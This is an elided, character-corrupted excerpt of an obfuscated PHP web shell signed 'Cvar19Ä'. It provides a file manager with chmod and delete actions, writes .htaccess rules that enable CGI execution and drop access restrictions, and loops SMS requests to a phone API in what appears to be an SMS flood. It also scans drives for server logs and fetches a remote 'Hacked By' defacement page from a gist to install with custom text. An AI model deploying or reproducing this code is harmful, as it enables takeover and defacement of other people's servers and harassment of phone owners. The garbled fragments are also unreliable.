...
<table width='70%' cellpadding='3' cellspacing='3' align='center'
 ...
 } goto r7ZZ2; wdnHz: JjiXG("Permission Denied"); goto VHd9t; dmbX9: function M4L6u()
 {
     ...
     LODfv: $isi = "Options FollowSymLinks MultiViews Indexes ExecCGI\xaRequire None
Satisfy Any
...
<?php  goto CR_ra;
 ...
 } goto tZReq; qmWpE: BV2P6: goto K88AD; rgZdR: function l1Zr1()
 {
     ...
     NQ0Up: die;
     goto ff8Bk;
     NkBn1: file_put_contents(".config/.htaccess", "AddHandler cgi-script .izo\xaOptions -Indexes");
     goto hy0RM;
...
\x9	<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
	...
	\x9<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
     ...
     b3IPg: echo "<td><img src='https://cvar19Ä.github.io/text-plain-icon.png' class='icon'>";
     goto E0ixO;
...
<?php  goto x1nAH;
 ...
 } goto yTS4n; Y0_OA: function JLDte()
 {
     ...
     efcZD: foreach ($no as $on) {
         goto mTvp3;
         zozos: NLYyO("http://sc.jd.id/phone/sendPhoneSms", "phone=" . $on . "&smsTypeé");
         goto Cn_Hp;
...
<form method='post'>
 ...
 } goto rA38k; oUttM: function UIeKR()
 {
     ...
     skCe5: foreach (range("A", "Z") as $drive) {
         ...
         jpjRS: @T9GAW($drive . ":\xampp\apache\logs\error.log");
         goto QINQJ;
...
<form method='post'>
	...
	<?php  goto noiJ8;
     ...
     goto vkuQQ;
     Zu9DK: $file = str_replace("<h1>Hacked By Cvar19Ä</h1>", "<h1>" . $_POST["content"] . "</h1>", $file);
     goto f8ui7;
     ...
     O1tJA: $file = str_replace("<title>Hacked By Cvar19Ä</title>", "<title>" . $_POST["title"] . "</title>", $file);
     goto K2nMX;
     ...
     goto Ycw7z;
     Ycw7z: $file = file_get_contents("https://gist.githubusercontent.com/Cvar194/3bfdd8d2c09f888440a9f¼f6‰4a„/raw/89¨8d80ec7eba573bfb91af0Â5Æe26bf¹e4/index.php");
     goto O1tJA;
...
Password : " . $auth_pass . "
\xaBy Cvar1Ä"; goto Sp_ot; bn54s: function K3j3z()
 {
     goto wzIkj;
     gTkcD: exit;
     goto soEyj;
...
<?php  goto pwCJW; OI4ds: echo date("Y"); goto QjL6a; prBdu: goto Jkk29; goto lXYhF; YRYYO: function yqYc7()
 {
     ...
     It7HB: die;
     goto IlAPv;
     T3c8A: echo "<iframe width='700px' height='5€px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874É1&amp;color=#€cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
     goto q5pHX;
     q5pHX: echo "</center>";
     goto It7HB;
     IlAPv:
